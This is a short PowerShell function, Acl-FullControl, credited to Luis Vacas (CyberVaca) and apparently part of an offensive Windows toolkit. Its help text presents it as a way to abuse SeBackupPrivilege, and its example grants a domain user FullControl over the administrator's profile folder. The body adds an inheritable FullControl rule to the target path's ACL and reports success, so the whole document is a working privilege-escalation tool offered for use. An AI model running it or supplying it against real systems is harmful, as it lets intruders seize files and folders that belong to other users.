function Acl-FullControl {param ($user,$path)
$help = @"
.SYNOPSIS
    Acl-FullControl
    PowerShell Function: Acl-FullControl
    Author: Luis Vacas (CyberVaca)

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Acl-FullControl -user domain\usuario -path c:\users\administrador

    Description
    -----------
    If you have the SeBackupPrivilege privilege. You can change the permissions to the path you select.

"@
if ($user -eq $null -or $path -eq $null) {$help} else {
"[+] Current permissions:"
get-acl $path | fl
"[+] Changing permissions to $path"
$acl = get-acl $path
$aclpermisos = $user,'FullControl','ContainerInherit,ObjectInherit','None','Allow'
$permisoacl = new-object System.Security.AccessControl.FileSystemAccessRule $aclpermisos
$acl.AddAccessRule($permisoacl)
set-acl -Path $path -AclObject $acl
"[+] Acls changed successfully."
get-acl -path $path | fl
}
}